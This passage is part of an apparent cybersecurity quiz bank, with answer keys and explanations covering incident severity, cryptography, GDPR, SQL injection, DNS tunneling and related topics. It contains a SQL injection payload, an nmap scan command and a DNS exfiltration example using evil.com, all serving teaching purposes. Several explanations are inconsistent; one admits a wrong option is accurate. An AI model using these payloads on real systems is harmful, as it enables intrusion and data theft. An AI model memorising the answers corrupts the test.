  {id:658,domain:O,question:"What is a security incident severity classification?",options:["A medical triage protocol used by corporate physical security and emergency response teams to classify the severity of personal injuries sustained during workplace violence or physical security incidents","A system categorizing incidents by potential business impact and urgency to prioritize response resources and communication appropriately","A vulnerability scoring methodology that assigns numerical severity ratings to software security flaws based on exploitability, impact, and environmental factors in affected systems","A threat attribution framework that groups security incidents into categories based on which known threat actor group's indicators of compromise and TTPs are identified during the investigation"],answer:1,explanation:"Severity tiers (P1: critical breach in progress, P2: active intrusion, P3: malware detected, P4: policy violation) determine response time SLAs and escalation paths.",optionExplanations:["Medical triage classifies physical injury severity; security incident severity classification categorizes cybersecurity incidents by their potential business impact and urgency to ensure appropriate resource allocation and escalation.","Severity classification helps SOC teams prioritize — a P1 wakes up the CISO at 2am; a P4 gets addressed during business hours — allocating response effort appropriately to impact.","CVSS scores rate individual vulnerability severity; incident severity classification categorizes active security incidents — rating the overall business impact and response urgency of a confirmed security event, not individual vulnerabilities.","Threat attribution identifies who is responsible; severity classification determines how serious an incident is and how urgently it requires response — based on business impact and data sensitivity, not attacker identity."]},
  {id:659,domain:T,question:"What is a threat actor's motivation and why does it matter for defense?",options:["Attacker motivation is an irrelevant factor in technical defense planning because network security controls, endpoint detection tools, and security monitoring systems must protect assets regardless of the attacker's goals","Understanding whether attackers are nation-states (espionage), criminals (financial gain), hacktivists (ideological), or insiders (revenge) helps predict targets, techniques, and persistence level","Threat actor motivation is exclusively relevant to law enforcement prosecution and post-incident attribution efforts, with no practical application in configuring or prioritizing defensive security controls","All categories of threat actors employ an identical standardized toolkit of attack techniques drawn from the same methods, making motivation analysis an irrelevant distraction from purely technical defensive measures"],answer:1,explanation:"Nation-states persist for months targeting IP; criminals move quickly for financial gain; hacktivists target reputation. Different motivations mean different defenses are most relevant.",optionExplanations:["Technical controls do protect against all attackers, but motivation directly shapes attack targeting, TTPs, and persistence — understanding motivation allows defenders to prioritize protecting what attackers actually want to compromise.","Understanding attacker motivation helps predict: what they'll target (IP vs. credit cards), how long they'll persist, what TTPs they'll use, and whether they'll be deterred by increased security investment.","Motivation analysis informs defense directly — financial criminals target payment data requiring PCI controls; nation-state espionage targets IP requiring data loss prevention; understanding motivation enables targeted defensive resource allocation.","Different threat actors use markedly different TTPs — nation-states use low-and-slow APT techniques while ransomware actors move quickly and noisily; motivation shapes technique selection, making it directly relevant to defensive planning."]},
  {id:660,domain:G,question:"What is cryptographic agility?",options:["A high-throughput protocol that transmits cryptographic keys and certificates across wide-area networks using optimized routing to minimize latency in geographically distributed key management systems","Designing systems to support multiple cryptographic algorithms and easily replace them when vulnerabilities are discovered or algorithms are deprecated without requiring full system redesign","A software development methodology that applies iterative agile sprint cycles to cryptographic library development, releasing frequent incremental updates to algorithm implementations rather than infrequent major versions","A TLS protocol capability allowing negotiating parties to dynamically renegotiate and switch the active cipher suite mid-session when performance requirements or security policy changes warrant a different algorithm selection"],answer:1,explanation:"Cryptographic agility is crucial for post-quantum migration — systems that hardcoded SHA-1 or MD5 faced expensive rewrites when those algorithms were broken.",optionExplanations:["Key transport protocols address secure distribution; cryptographic agility is an architectural design property — the ability to swap out cryptographic algorithms within a deployed system without requiring complete redesign or redeployment.","Cryptographic agility means algorithm selection is not hardcoded but configurable — enabling organizations to quickly respond to cryptographic vulnerabilities by switching algorithms without architectural changes.","Agile development applied to cryptographic libraries describes a software development approach; cryptographic agility is a system design principle — building systems so cryptographic algorithms can be replaced quickly when vulnerabilities emerge.","Mid-session cipher renegotiation is a specific TLS feature; cryptographic agility is the broader architectural principle of designing systems to support easy algorithm replacement when algorithms are deprecated or compromised."]},
  {id:661,domain:T,question:"What is a SQL injection UNION attack?",options:["An attack that merges the schemas of two physically separate database servers into a single unified view, enabling cross-database join queries to combine records from both production systems simultaneously","Exploiting SQL injection to append UNION SELECT statements that retrieve data from other tables in the database, extracting sensitive data from tables the application doesn't normally query","A persistent attack campaign that executes multiple parallel SQL injection payloads simultaneously against the same vulnerable endpoint, aggregating partial results from each attempt to reconstruct complete database contents","An SQL injection technique that creates referential integrity relationships between tables in different database schemas, enabling cross-database foreign key joins to expose otherwise isolated records"],answer:1,explanation:"UNION attacks require matching column count and data types — but enable extracting usernames, passwords, and sensitive data from any table in the database the web application user can access.",optionExplanations:["Schema merging is a database administration operation; UNION SQL injection appends UNION SELECT statements to application queries to extract data from tables the application doesn't normally expose in its output.","A UNION SQL injection appends 'UNION SELECT username, password FROM users' to a vulnerable query — if the application returns search results, the attacker's injected SELECT results appear in those results.","Parallel payload attacks describe multi-threaded exploitation; UNION attacks specifically use SQL's UNION operator to combine the application's original query results with attacker-controlled SELECT statements that extract data from other tables.","Creating foreign key relationships is database design DDL; UNION SQL injection uses the SQL UNION operator in injection payloads to combine the application query's result set with additional attacker-specified query results from arbitrary tables."]},
  {id:662,domain:A,question:"What is a container security scanner?",options:["A lightweight security agent injected as a sidecar container into running container instances to monitor system calls, file system changes, and network connections for malicious behavior at runtime","A tool that analyzes container images for known vulnerabilities in OS packages and application dependencies before deployment, preventing vulnerable containers from running in production","An optical barcode and asset tag scanning device installed in data center aisles to read physical labels on server racks, network chassis, and storage enclosures for equipment inventory tracking","A runtime security monitoring tool that continuously inspects active container processes, system call patterns, and network traffic in real time to detect exploitation attempts and abnormal execution behaviors"],answer:1,explanation:"Container scanners (Trivy, Snyk Container, Twistlock) check images against CVE databases in CI/CD pipelines — blocking deployment of containers with critical vulnerabilities.",optionExplanations:["Runtime sidecar security agents perform behavioral monitoring of running containers; container image scanners analyze static container images before deployment to identify known vulnerabilities in OS packages and application dependencies.","Container image scanners inventory all packages and libraries in an image and cross-reference against vulnerability databases — providing a vulnerability report before the image is ever deployed.","Physical asset scanning uses barcode readers for hardware inventory; container security scanning analyzes software container images for known CVEs in their OS packages and application dependency components before production deployment.","Runtime container security detects threats in running containers; image scanning is a static pre-deployment analysis that identifies vulnerabilities in container images before they are ever instantiated in a production environment."]},
  {id:663,domain:O,question:"What is a security training program's effectiveness measurement?",options:["Tracking the total number of employees who complete mandatory annual security awareness modules, used as the primary compliance metric submitted to auditors and leadership in annual compliance reports","Measuring changes in security behavior (phishing click rates, password hygiene, incident reporting) and knowledge retention over time to assess training impact and ROI","Calculating cost per employee per training hour and comparing against industry benchmarks to determine whether the current awareness training vendor provides adequate value for the organization's investment","Counting the total number of training courses, video lessons, quiz modules, and phishing templates available in the learning management system used to deliver the security awareness program"],answer:1,explanation:"Effective training measurement tracks phishing simulation click rates before and after training, password audit results, and reported incident volume — demonstrating behavioral change, not just completion.",optionExplanations:["Completion rates demonstrate participation compliance but not training effectiveness; measuring actual behavioral changes — reduced phishing susceptibility, improved password hygiene, increased incident reporting — shows whether training achieves its security goal.","Effective security training programs measure behavioral outcomes — reduced phishing susceptibility, increased suspicious activity reporting, improved password practices — not just course completion or knowledge scores.","Cost efficiency metrics evaluate procurement value; training effectiveness is measured by whether security behaviors actually improve — lower phishing click rates, better password practices, and increased suspicious activity reporting rates over time.","Content catalog size measures program breadth but not effectiveness; the meaningful measure is behavioral change over time — whether employees click fewer phishing links, report more incidents, and demonstrate improved security hygiene."]},
  {id:664,domain:P,question:"What is the right to data portability under GDPR?",options:["A data subject compliance requirement obligating organizations to deliver a complete copy of all personal data stored about an individual on physical portable media such as encrypted USB drives","An individual's right to receive their personal data in a structured, machine-readable format and to transmit it to another service provider","An individual's right to request that an organization physically relocate their stored personal data to a geographically different data center region or cloud availability zone operated by the same provider","An organizational right permitting IT departments to migrate personal data repositories between different database vendors, cloud platforms, or storage architectures without requiring individual data subject consent"],answer:1,explanation:"GDPR Article 20 enables 'competitive portability' — you can take your fitness app data history to a competitor app without having to manually re-enter years of data.",optionExplanations:["Physical media delivery is one possible format; data portability requires providing personal data in a structured, commonly used, machine-readable electronic format — enabling direct electronic transfer to other service providers.","Data portability (GDPR Article 20) allows individuals to download their personal data in standard formats (CSV, JSON) and transfer it to competing services — reducing vendor lock-in and promoting competition.","Physical data center location selection is infrastructure management; data portability allows individuals to receive their data electronically and transmit it to a competing service provider — supporting market competition and service switching.","Organizational data migration is an IT operations matter; GDPR data portability is specifically a data subject right — an individual right to receive personal data in a usable format and transmit it to another controller."]},
  {id:665,domain:G,question:"What is FIPS 140-2/140-3 validation?",options:["A throughput and latency performance benchmark that specifies minimum firewall processing rates and acceptable packet inspection delays for next-generation firewall appliances deployed at federal network perimeters","A US government standard specifying security requirements for cryptographic modules (hardware and software) used in sensitive government applications, with four levels of increasing security","A NIST-developed voluntary risk management framework providing guidelines for implementing cybersecurity controls across civilian federal agencies' information technology systems and critical infrastructure","A government publication defining minimum required processing throughput rates and maximum acceptable latency targets for information systems operating within federal data centers and authorized cloud environments"],answer:1,explanation:"FIPS 140-2 levels range from 1 (software-only acceptable) to 4 (tamper-responsive physical security) — federal agencies require FIPS-validated modules for protecting sensitive-but-unclassified information.",optionExplanations:["Firewall performance benchmarks address throughput testing; FIPS 140-2/3 is a security validation standard specifically for cryptographic modules, defining requirements for algorithm correctness, key management, and physical security of the cryptographic boundary.","FIPS 140-2 (and its successor FIPS 140-3) validates that cryptographic modules meet defined security requirements — covering algorithm implementation, key management, physical security, and self-tests.","NIST CSF is a risk management framework; FIPS 140-2/3 is a mandatory cryptographic module validation standard — not a framework but a specific validation program with four increasing security levels for cryptographic implementations.","System performance standards govern throughput requirements; FIPS 140-2/3 defines security requirements for cryptographic modules — covering algorithm implementation correctness, entropy sources, key management, and tamper resistance at four security levels."]},
  {id:666,domain:T,question:"What is a network scanner's purpose in attack reconnaissance?",options:["A physical infrastructure inspection of Ethernet patch cords, fiber cable runs, and conduit pathways throughout a data center to verify proper documentation, labeling, and physical cable plant integrity","Discovering live hosts, open ports, running services, and operating system versions on a network — providing attackers or authorized testers with the attack surface map","A handheld or rack-mounted inspection appliance that uses RF detection, X-ray, and visual analysis to check hardware components and server chassis for unauthorized modifications or hardware implants","Analyzing inbound email messages against databases of known phishing sender domains, malicious attachment signatures, and URL reputation feeds to quarantine threats before they reach user inboxes"],answer:1,explanation:"Nmap is the quintessential network scanner — 'nmap -sV -O target.com' identifies open ports, service versions, and OS, creating the target profile for subsequent attack phases.",optionExplanations:["Physical cable plant inspection is infrastructure documentation work; network scanning uses software tools like Nmap to discover live hosts, enumerate open ports, identify running services, and fingerprint operating systems across IP networks.","Network scanners identify what's reachable, what's running, and what version — enabling identification of vulnerable service versions for subsequent exploitation.","Hardware implant detection uses specialized physical inspection tools; network scanning uses network protocol probes to discover and enumerate hosts, services, and software versions on IP networks for attack surface mapping.","Email security filtering inspects message content and metadata; network scanning probes TCP and UDP ports on network hosts to discover what services are listening — enabling identification of attack surface targets."]},
  {id:667,domain:A,question:"What is a cloud-native application protection platform (CNAPP)?",options:["An application development framework designed for building microservices-based workloads that natively integrate with cloud provider APIs without requiring traditional middleware or on-premises infrastructure","An integrated security platform combining CSPM, CWPP, and additional capabilities to provide holistic security for cloud-native applications throughout their lifecycle","A single-pane-of-glass management portal enabling cloud administrators to configure IAM policies, resource quotas, compliance guardrails, and billing controls within a cloud tenant","A cloud-hosted web application firewall platform that protects internet-facing applications from volumetric DDoS attacks using globally distributed anycast traffic scrubbing and BGP-based traffic diversion"],answer:1,explanation:"CNAPPs (Wiz, Orca Security, Palo Alto Prisma Cloud) provide end-to-end visibility — from code scanning through runtime protection — addressing the fragmented cloud security tool landscape.",optionExplanations:["Cloud-native development frameworks address application architecture; CNAPP is a security platform category that converges multiple cloud security disciplines to protect cloud-native applications throughout their build, deploy, and runtime lifecycle.","CNAPP converges multiple security capabilities (CSPM for infrastructure, CWPP for runtime, container security, infrastructure entitlement management) into a unified platform for cloud-native security.","Cloud administration portals manage cloud resources; CNAPP is a security platform integrating CSPM, CWPP, container security, and entitlement management to provide holistic security for cloud-native applications and infrastructure.","Cloud WAF and DDoS scrubbing services address specific attack types; CNAPP provides comprehensive lifecycle security for cloud-native applications including configuration risk, workload protection, and container and API security."]},
  {id:668,domain:O,question:"What is a security operations maturity assessment?",options:["A formal competency evaluation process that assesses individual security analyst technical skills, certifications, and incident handling abilities for promotion decisions and role-specific hiring","A structured evaluation of a security operations center's capabilities across people, process, and technology dimensions against a defined maturity framework","A vendor evaluation process that compares detection capabilities, automation features, integration options, and total cost of ownership across competing SIEM and SOAR platform offerings","A procedural audit of physical access controls, badge reader configurations, visitor management processes, and surveillance systems protecting the security operations center facility from unauthorized entry"],answer:1,explanation:"SOC assessments evaluate detection coverage (% of MITRE ATT&CK covered), response time metrics, analyst skills, tool integration, and process documentation — identifying gaps for improvement.",optionExplanations:["Individual skill assessments are HR performance management; SOC maturity assessments evaluate the overall security operations center's organizational capabilities across people, process, and technology against a defined maturity framework.","SOC maturity assessments measure readiness across dimensions: monitoring coverage, detection rules quality, analyst training, automation level, playbook completeness, and metrics programs.","Security tool procurement evaluations assess vendor products; SOC maturity assessments evaluate the security operations center's overall effectiveness — including people, processes, detection quality, and technology integration.","Physical security assessments of SOC facilities address facility protection; SOC maturity assessments evaluate cybersecurity operational capabilities — monitoring coverage, detection rule quality, analyst skills, and automation maturity."]},
  {id:669,domain:T,question:"What is an on-path attacker (formerly man-in-the-middle)?",options:["An insider threat actor who physically stations themselves near executives in open office environments to eavesdrop on sensitive conversations and observe confidential information displayed on nearby screens","An attacker who has positioned themselves in the communication path between two parties, enabling them to intercept, read, and potentially modify traffic without the parties' knowledge","An attacker who specializes in compromising on-premises servers, workstations, and network devices but lacks the capability or access required to extend attacks to cloud-hosted or SaaS resources","A penetration tester who specifically evaluates organizational exposure to on-path attacks by performing ARP spoofing, SSL stripping, and rogue access point insertion during authorized network testing engagements"],answer:1,explanation:"On-path attacks (ARP poisoning, rogue AP, BGP hijacking) place the attacker inline in network traffic flows — the new preferred term per CompTIA to avoid gender-specific language.",optionExplanations:["Physical proximity eavesdropping is shoulder surfing; on-path attackers position themselves in the network communication path between two parties, intercepting and potentially modifying digital traffic without the communicating parties' awareness.","An on-path attacker intercepts communications between two parties who believe they're talking directly — enabling eavesdropping, credential theft, and content manipulation.","Targeting on-premises infrastructure describes an attacker's scope preference; on-path refers to network positioning — an attacker in the communication path between parties, able to intercept and modify traffic flowing between them.","Penetration testers simulating on-path attacks evaluate defensive controls; an on-path attacker is the threat actor who actually positions themselves to intercept real communications between two parties without their knowledge."]},
  {id:670,domain:G,question:"What is SP 800-53?",options:["A fictional transmission control protocol specification defining speed and throughput requirements for 800-megabit-per-second backbone segments in federal agency network infrastructure deployments","NIST Special Publication 800-53: a comprehensive catalog of security and privacy controls for federal information systems and organizations, widely used as a security control reference","A fictional NIST network security protocol specification operating at 800 Mbps throughput while enforcing exactly 53 configurable policy controls — numbers representing performance and control count respectively","A NIST-maintained document classification scheme specifying sensitivity handling requirements, marking standards, and authorized recipient lists for government publications containing information above the SECRET classification level"],answer:1,explanation:"NIST SP 800-53 Rev 5 provides ~1,000 controls in 20 families — used by federal agencies (required by FISMA) and widely referenced by private sector organizations building security programs.",optionExplanations:["SP 800-53 is not a speed protocol; it is NIST Special Publication 800-53 — a comprehensive catalog of security and privacy controls for federal information systems, not a network performance specification.","NIST SP 800-53 organizes controls into families (Access Control, Audit and Accountability, Incident Response, etc.) with baselines (Low, Moderate, High) — the foundation for FISMA compliance.","The numbers in SP 800-53 are simply the NIST publication series number and document number; the actual catalog contains approximately 1,000 controls organized in 20 families, not 53.","Government classification systems are separate from NIST SPs; SP 800-53 is a security control catalog for civilian federal information systems, not a classification or handling standard for national security information."]},
  {id:671,domain:T,question:"What is a birthday attack's application to digital signatures?",options:["Exploiting statistical collision probability principles to generate a fraudulent document whose hash value matches a legitimately signed original, allowing the valid signature to be transferred to the malicious document","Finding two messages with the same hash so a valid signature on one is also valid for the other, enabling document forgery without knowing the signer's private key","A temporal attack exploiting predictable timestamp generation in digital signature schemes, backdating the signing time to make fraudulent documents appear signed within a certificate's validity window","A social engineering technique that exploits personal milestones and memorable dates to guess security questions, four-digit PINs, or passwords based on a target's birthday or anniversary dates"],answer:1,explanation:"If an attacker can find M1 and M2 where hash(M1)=hash(M2), they can get M1 legitimately signed, then substitute M2 with the same signature — forging a signature on a fraudulent document.",optionExplanations:["This accurately describes a birthday attack on signatures but is slightly different from the definition given; the correct answer specifically explains finding two messages with the same hash enabling forged document substitution.","Birthday attacks on signature schemes find hash collisions — if two different messages produce the same hash, the digital signature (which signs the hash) is equally valid for both messages.","Timestamp forgery attacks exploit time-related weaknesses in signature verification; birthday attacks exploit hash collision probability — finding two messages with the same hash to substitute a malicious message for a legitimately signed one.","Date-based credential guessing is a password attack using personal information; birthday attacks in cryptography exploit the birthday paradox — the mathematical probability of hash collisions — to forge digital signatures."]},
  {id:672,domain:A,question:"What is the principle of secure by design?",options:["A physical security engineering principle requiring that protective barriers, access control entry points, and surveillance infrastructure be constructed using hardened materials rated to resist forced entry","Building security in from the beginning of a system's design rather than adding it later, making security properties fundamental to the architecture rather than bolt-on additions","An information security policy mandating that all engineering design files, system architecture blueprints, and intellectual property documentation be stored in encrypted repositories with strict version-controlled access","An organizational policy requiring two independent, security-cleared reviewers to separately evaluate and formally approve all system design documents before any engineering implementation work begins"],answer:1,explanation:"Secure by design avoids the expensive retrofitting of security — SQL injection prevention built into the query API is cheaper than patching it in thousands of code locations.",optionExplanations:["Physical security design specifies material and barrier requirements; secure by design is a software and system architecture principle that builds security properties into technical systems from the initial design phase, not as afterthoughts.","Secure by design treats security as a first-class requirement from day one — choosing secure protocols, building input validation into frameworks, using memory-safe languages — preventing classes of vulnerabilities by design.","Protecting design document confidentiality is information security; secure by design is an architectural methodology — the practice of incorporating security requirements, threat models, and security controls from the earliest design stages.","Two-person review requirements are a security control applied to documentation; secure by design is an architectural philosophy about how systems are built — making security a fundamental design property rather than a post-build addition."]},
  {id:673,domain:O,question:"What is an information security policy's relationship to security culture?",options:["Well-documented and frequently communicated security policies are sufficient alone to ensure employee compliance with security requirements, eliminating the need for culture-building programs or leadership modeling","Security policies set expectations and demonstrate commitment, but security culture — where employees internalize security as a shared value — determines whether policies are actually followed","A strong organizational security culture emerges organically from employee behavior patterns over time and implicitly generates the written policies that management later formally documents and publishes","Security policies should only be created and enforced reactively after organizational culture has demonstrably failed to produce adequate secure employee behaviors through informal norms and peer influence"],answer:1,explanation:"Organizations with strong security culture don't just follow policies because they have to — employees report suspicious emails, question unusual requests, and consider security in decisions without being reminded.",optionExplanations:["Policies establish rules but compliance without cultural internalization requires constant enforcement; organizations with strong security cultures have employees who follow security practices voluntarily — policies alone cannot achieve this.","Policies define expected behavior formally; security culture is the environment where those behaviors are internalized as shared values — culture makes policies effective without constant enforcement.","Culture can influence what policies are written, but documented policies require deliberate creation by management; security culture and policies are mutually reinforcing — neither automatically generates the other.","Policies are proactive requirements, not reactive failures; organizations need both documented policies as formal requirements and security culture that motivates voluntary compliance — neither replaces the other."]},
  {id:674,domain:P,question:"What is a privacy-by-design principle in technical systems?",options:["A user interface design methodology focused on making privacy settings prominently visible and easily discoverable within application interfaces, improving transparency and user awareness of data collection practices","Proactively embedding privacy controls into technology systems and business practices from the design phase, not as an afterthought — making privacy the default, not an option","A software architecture approach that treats privacy controls as optional configuration elements, allowing organizations to design systems without privacy protections that can be enabled or disabled as needed","A professional development curriculum teaching data protection officers to apply privacy engineering principles when reviewing technical system designs submitted by development teams for compliance evaluation"],answer:1,explanation:"Privacy by design (Ann Cavoukian's 7 principles) includes: proactive not reactive, privacy as default, full functionality, end-to-end security, visibility, respect for user privacy, and embedded into design.",optionExplanations:["UI transparency design improves privacy visibility; privacy by design proactively embeds privacy controls into the fundamental architecture and default behaviors of systems, not just making existing privacy settings more visible in the interface.","Privacy by design anticipates and prevents privacy invasions rather than responding to them — it makes privacy the default condition and embeds privacy controls into system architecture.","Treating privacy as optional contradicts privacy by design; this principle specifically requires that privacy is the default state — systems must be designed so privacy is automatically protected without users taking any action to enable it.","DPO training curricula build individual expertise; privacy by design is a principle that requires developers, architects, and product managers to embed privacy into systems from conception — not just a framework for DPO review processes."]},
  {id:675,domain:G,question:"What is a cryptographic key agreement protocol?",options:["A formal written agreement between two organizations specifying which cryptographic algorithms, key lengths, cipher modes, and protocol versions will govern the encryption of data exchanged between their systems","A protocol that allows two parties to jointly establish a shared secret key over an insecure channel without either party transmitting the actual key — the key is derived by both parties independently","A legal contract between an organization and its key management service provider specifying responsibilities for cryptographic key generation, secure storage, rotation schedules, backup, and emergency recovery procedures","A key distribution protocol where a trusted central key distribution center generates symmetric encryption keys and transmits encrypted copies to each requesting party, who decrypts them using pre-shared credentials"],answer:1,explanation:"Diffie-Hellman and ECDH are key agreement protocols — both parties contribute values, perform mathematics, and independently derive the same secret without it ever traversing the network.",optionExplanations:["Cryptographic standards agreements negotiate protocol parameters; key agreement is a cryptographic protocol mechanism — specifically enabling two parties to independently derive an identical shared secret without ever transmitting that secret value.","Key agreement enables secure communication establishment without prior shared secrets — each party performs mathematical operations with their private value and the other's public value to arrive at the same result.","Key management contracts are vendor agreements governing operational procedures; key agreement is a cryptographic protocol — a mathematical mechanism enabling two parties to jointly establish a shared secret over an insecure channel.","Key distribution by trusted third parties is a key transport model; key agreement protocols like Diffie-Hellman allow parties to derive the same shared secret independently using only publicly exchanged values — no trusted intermediary required."]},
  {id:676,domain:T,question:"What is an exfiltration technique using DNS tunneling?",options:["A network infrastructure technique that routes all TCP/IP traffic through physical DNS server hardware co-located in high-bandwidth data centers to leverage dedicated infrastructure for improved data transmission performance","Encoding stolen data within DNS queries and responses to covertly exfiltrate information through DNS ports, which are rarely blocked and not inspected in many environments","A reconnaissance technique where attackers query DNS records to enumerate hostnames, IP addresses, and mail server configurations in order to identify and map an organization's internet-facing infrastructure","An attack against authoritative DNS servers that manipulates zone transfer responses to steal the complete mapping of all hostnames, IP addresses, and mail server records for a target organization's registered domains"],answer:1,explanation:"DNS tunneling encodes data in subdomain labels (base64 encoded data becomes 'c3RvbGVuZGF0YQ.evil.com') — each DNS query carries a data payload, slowly exfiltrating data through firewall-allowed DNS traffic.",optionExplanations:["Network routing optimization through co-location is a performance engineering concept; DNS tunneling encodes stolen data within DNS query and response fields to covertly exfiltrate it through DNS traffic, exploiting permissive outbound DNS policies.","DNS tunneling encodes data within DNS queries/responses — since most organizations allow outbound DNS, attackers can slowly exfiltrate data by encoding it in DNS queries to attacker-controlled resolvers.","DNS enumeration for reconnaissance is a separate information gathering technique; DNS tunneling encodes actual stolen data payloads within DNS query and response content to exfiltrate data covertly through rarely inspected DNS traffic.","DNS zone transfer exploitation steals domain infrastructure information; DNS tunneling exfiltrates arbitrary data by encoding it within the structure of DNS query and response packets flowing through permissive network egress controls."]},
  {id:677,domain:A,question:"What is a security zone in network design?",options:["A geographically defined jurisdiction where specific data protection laws, export control regulations, or national security requirements impose special handling obligations on information stored or transmitted there","A network segment with a defined trust level and security policy, where devices with similar security requirements are grouped and access between zones is controlled by security devices","A physically isolated section within a data center or office facility designated exclusively for security operations personnel, where access is restricted to vetted SOC team members via biometric access controls","A universally synchronized time zone configuration applied to all security event log timestamps within a SIEM platform to ensure consistent chronological ordering when correlating events from distributed sources"],answer:1,explanation:"Typical zones: Internet (untrusted) → DMZ (semi-trusted, public services) → Internal (trusted, user systems) → Restricted (highest trust, sensitive data). Each boundary has controls.",optionExplanations:["Geographic regulatory jurisdictions define legal data handling requirements; security zones are logical network segments with defined trust levels — devices with similar security requirements are grouped and inter-zone access is controlled by security devices.","Security zones group systems by trust level — a web server in the DMZ shouldn't have direct access to the HR database in the restricted zone; firewall rules enforce zone boundaries.","Physically restricted security team work areas are physical security controls; network security zones are logical segmentation constructs — trust-level groupings of network-connected devices whose inter-zone communications are controlled by firewalls.","SIEM timestamp normalization is a log management practice to enable accurate event correlation; security zones are network segmentation constructs that group devices by trust level and enforce access control between segments."]},
  {id:678,domain:O,question:"What is lateral movement detection?",options:["Monitoring physical asset tracking systems to identify when servers, rack-mounted appliances, or other data center equipment have been relocated between cabinets or removed from the facility","Identifying when attackers have compromised one internal system and are using it to access other systems within the same network — through abnormal authentication patterns and unusual network connections","Using physical motion sensors, passive infrared detectors, and camera-based video analytics to identify unauthorized human movement within restricted server rooms or secured data center facility areas","Monitoring physical access control badge reader logs to identify personnel accessing restricted server rooms, secure network closets, or protected data center areas without prior authorization or escort"],answer:1,explanation:"Lateral movement detection looks for: admin tool usage from unusual sources, authentication to previously unaccessed systems, anomalous RDP/SMB connections, and pass-the-hash patterns.",optionExplanations:["Physical asset location tracking is data center facilities management; lateral movement detection identifies attackers traversing between internal systems — through abnormal authentication patterns and unusual internal network connections.","Detecting lateral movement requires correlating authentication events — same credentials used from different machines, access to systems the account has never accessed before, unusual protocol usage.","Physical intrusion detection uses sensors and cameras to monitor facility access; lateral movement detection monitors network authentication events and connection patterns to identify attackers moving between internal systems.","Physical access control monitoring tracks human entry to secured facilities; lateral movement detection analyzes digital authentication patterns and network traffic to identify attackers compromising and traversing between internal network systems."]},
  {id:679,domain:T,question:"What is a cache poisoning attack?",options:["A sabotage technique where attackers introduce toxic chemical contaminants into a data center's liquid cooling infrastructure to cause catastrophic thermal damage to servers and network equipment","Inserting malicious data into a cache (DNS cache, web cache, ARP cache) to cause recipients to use corrupted information — redirecting traffic or serving malicious content","A memory exploitation attack that overwrites application heap or stack memory regions with malicious data, corrupting program state to alter execution flow and achieve arbitrary code execution","An attack against relational database systems that injects malicious SQL statements into query result caching layers to contaminate subsequent query responses with falsified data records"],answer:1,explanation:"DNS cache poisoning inserts fake records; ARP cache poisoning enables MitM attacks on local networks; web cache poisoning serves malicious responses to multiple users from a corrupted cache.",optionExplanations:["Physical infrastructure sabotage is a kinetic attack; cache poisoning inserts malicious data into logical caches — DNS cache, ARP cache, or web proxy cache — causing systems that consult those caches to receive and use fraudulent information.","Cache poisoning targets the trust systems place in cached data — corrupting the cache means many subsequent operations use the attacker's fraudulent data without knowing the cache was manipulated.","Heap or stack corruption is a memory exploitation technique; cache poisoning targets the data stored in name resolution or content caches — corrupting what systems believe to be correct network addresses or legitimate web content.","Database result cache manipulation is a database security concern; cache poisoning most commonly refers to DNS cache poisoning, ARP cache poisoning, and web cache poisoning — corrupting address resolution or content delivery caches."]},
  {id:680,domain:G,question:"What is the security implication of weak random number generation?",options:["A weak or biased random number generator produces numeric sequences with statistically detectable patterns, marginally reducing entropy in generated symmetric encryption keys and slightly degrading cipher strength","If a random number generator is predictable, all cryptographic operations depending on randomness (key generation, nonce creation, session IDs) become predictable, destroying cryptographic security","Predictable random number generation introduces minor statistical biases into generated cryptographic material but has no practically significant impact on security given modern key lengths and algorithm strength","Random number generator vulnerabilities exclusively affect password-hashing operations and have no bearing on asymmetric key generation, symmetric key exchange protocols, nonce generation, or session token security"],answer:1,explanation:"The Debian OpenSSL bug (2008) limited entropy to 32,768 possible values — all SSH keys generated on Debian/Ubuntu for 2 years were predictable, completely defeating their security.",optionExplanations:["Predictable RNGs don't merely marginally reduce security — they can completely undermine it; if an RNG is predictable, the key space effectively collapses to the set of predictable outputs, enabling complete brute force.","Cryptographic randomness is fundamental — keys generated from weak RNGs are predictable, nonces that repeat enable nonce-reuse attacks (devastating in AEAD modes), and predictable session IDs enable session hijacking.","Weak RNGs don't 'slightly' reduce security — they can catastrophically compromise it; cryptographic security depends fundamentally on unpredictability, and a predictable RNG can collapse an algorithm's effective security regardless of key length.","RNG weaknesses affect all cryptographic operations that depend on randomness — key generation, IV and nonce creation, session ID generation, and challenge values all require unpredictability that a weak RNG cannot provide."]},
  {id:681,domain:O,question:"What is a disaster recovery test?",options:["A tabletop exercise where executives and continuity planning team members discuss hypothetical crisis scenarios without activating recovery infrastructure or executing any actual failover or restoration procedures","An exercise that validates disaster recovery procedures by actually executing recovery processes to verify systems can be restored within RTO/RPO requirements","An emergency preparedness drill that exercises evacuation routes, fire suppression activation, emergency communication trees, and incident coordination procedures for physical damage scenarios affecting facilities","A desktop walkthrough exercise where team members review documented disaster recovery procedures to identify gaps and update documentation without activating any live recovery infrastructure"],answer:1,explanation:"Without testing, DRPs are untested assumptions — a test might reveal that the database backup is 3 weeks old, the restoration procedure is outdated, or the target RTO is impossible with current infrastructure.",optionExplanations:["Tabletop exercises are discussion-based reviews; a DR test validates actual recovery capabilities by executing real restoration procedures — activating backup systems, restoring data from backups, and verifying the organization can meet RTO/RPO targets.","DR testing (tabletop review, walkthrough, functional test, full simulation) verifies that backup systems work, restore procedures are current, and recovery time objectives are achievable.","Physical emergency response drills test life safety and facilities procedures; DR tests specifically validate IT system recovery capabilities — verifying that technical recovery procedures work and systems can be restored within defined time objectives.","Documentation review walkthroughs identify procedural gaps; a DR test actually executes recovery procedures to verify systems restore correctly within RTO/RPO objectives — validating that backups work and recovery processes are current."]},
  {id:682,domain:T,question:"What is a roaming adversary (threat hunter vs. threat intelligence)?",options:["A threat actor category defined by the use of geographically distributed attack infrastructure spanning multiple countries, specifically to obscure attribution and complicate incident responders' tracking efforts","A threat hunting approach that proactively searches for evidence of an attacker who has been moving through the network undetected, vs. threat intelligence which provides external context about attacker groups","A portable red team attack platform that enables wireless network assessments, rogue access point deployment, RF signal analysis, and mobile penetration testing from any geographic location","A specific threat actor profile characterizing attackers who achieve persistence by compromising Windows roaming profiles and Group Policy settings stored on Active Directory domain controllers"],answer:1,explanation:"Threat hunting assumes breach and searches production data; threat intelligence provides external knowledge about who's likely attacking and how to recognize them.",optionExplanations:["Using distributed infrastructure to complicate attribution is an OPSEC technique; the question distinguishes threat hunting — proactively searching for evidence of an attacker moving undetected through a network — from threat intelligence.","Threat hunting investigates internal data for adversary presence; threat intelligence provides external information about attackers' tools, TTPs, and campaigns to support hunting and defense.","Mobile penetration testing platforms are red team tools; the question distinguishes threat hunting, which proactively investigates internal telemetry for evidence of attacker presence, from external threat intelligence about attacker 